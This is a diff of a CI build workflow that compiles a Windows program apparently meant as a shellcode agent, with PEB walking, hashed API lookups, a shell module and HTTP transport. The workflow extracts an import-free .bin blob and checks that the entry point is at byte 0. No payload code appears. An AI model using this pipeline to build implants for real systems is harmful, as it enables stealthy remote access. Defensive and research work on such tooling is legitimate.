@@ -65,25 +65,31 @@ jobs:
           BUILD_NUMBER=$(git rev-list --count HEAD)
           COMMIT_HASH=$(git rev-parse --short=8 HEAD)
           echo "=== building windows-${{ matrix.arch }} (${{ matrix.triple }}-gcc) ==="
+          # entry.c MUST stay FIRST on the command line and carries only
+          # entry() (the stack probes live in src/stack_probes.c): the linker
+          # places the first object's code at the start of .text, so entry()
+          # becomes byte 0 of the .bin blob - no linker script, no /order
+          # file (lld in mingw mode rejects MSVC-style /order), and it works
+          # identically under GNU ld and lld.
           ${{ matrix.triple }}-gcc -O2 -s -nostdlib -Iinclude -Wall -Wextra \
-              -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector \
-              -Xlinker /entry:entry \
-              -Xlinker '/merge:.text.startup=.text' \
+              -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector -fno-jump-tables \
+              -e entry \
               -DID_BUILD_NUMBER="$BUILD_NUMBER" \
               -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
-              -o relay_client.exe \
-              entry.c src/main.c src/identity_headers.c src/transport.c src/shell.c \
-              src/report.c src/system_facts.c src/environment.c src/winhttp_api.c \
-              src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c \
-              src/peb.c src/system.c src/djb2.c src/logger.c
-          ${{ matrix.triple }}-objcopy -O binary --only-section=.text relay_client.exe relay_client.bin
+              -o minimal_agent.exe \
+              entry.c src/stack_probes.c src/main.c src/identity_headers.c \
+              src/transport.c src/shell.c src/report.c src/system_facts.c \
+              src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c \
+              src/advapi.c src/string.c src/memory.c src/peb.c src/system.c \
+              src/djb2.c src/logger.c
+          ${{ matrix.triple }}-objcopy -O binary --only-section=.text minimal_agent.exe minimal_agent.bin
 
-          imp=$(${{ matrix.triple }}-objdump -p relay_client.exe | grep -c 'DLL Name' || true)
+          imp=$(${{ matrix.triple }}-objdump -p minimal_agent.exe | grep -c 'DLL Name' || true)
           echo "imports: $imp (want 0)"
           [ "$imp" = "0" ] || { echo "FAIL: import table not empty"; exit 1; }
 
-          start=$(${{ matrix.triple }}-objdump -f relay_client.exe | awk 'tolower($0) ~ /start address/ {print $NF; exit}' | sed 's/^0x//')
-          text_vma=$(${{ matrix.triple }}-objdump -h relay_client.exe | awk '$2 == ".text" {print $4; exit}' | sed 's/^0x//')
+          start=$(${{ matrix.triple }}-objdump -f minimal_agent.exe | awk 'tolower($0) ~ /start address/ {print $NF; exit}' | sed 's/^0x//')
+          text_vma=$(${{ matrix.triple }}-objdump -h minimal_agent.exe | awk '$2 == ".text" {print $4; exit}' | sed 's/^0x//')
           test -n "$start" || { echo "FAIL: could not read PE entry address"; exit 1; }
           test -n "$text_vma" || { echo "FAIL: could not read .text VMA"; exit 1; }
           entry_rva=$(( 0x$start ))
@@ -92,15 +98,15 @@ jobs:
           echo "entry offset in .text: $entry_off (want 0)"
           [ "$entry_off" = "0" ] || { echo "FAIL: entry() is not at .text byte 0"; exit 1; }
 
-          head -c 2 relay_client.bin | od -c | head -1
-          if [ "$(head -c 2 relay_client.bin)" = "MZ" ]; then
+          head -c 2 minimal_agent.bin | od -c | head -1
+          if [ "$(head -c 2 minimal_agent.bin)" = "MZ" ]; then
             echo "FAIL: .bin starts with the PE header - objcopy copied the image"
             exit 1
           fi
 
           mkdir -p artifacts
-          cp relay_client.exe "artifacts/windows-${{ matrix.arch }}.exe"
-          cp relay_client.bin "artifacts/windows-${{ matrix.arch }}.bin"
+          cp minimal_agent.exe "artifacts/windows-${{ matrix.arch }}.exe"
+          cp minimal_agent.bin "artifacts/windows-${{ matrix.arch }}.bin"
           ls -la artifacts/
 
       - name: Upload artifacts
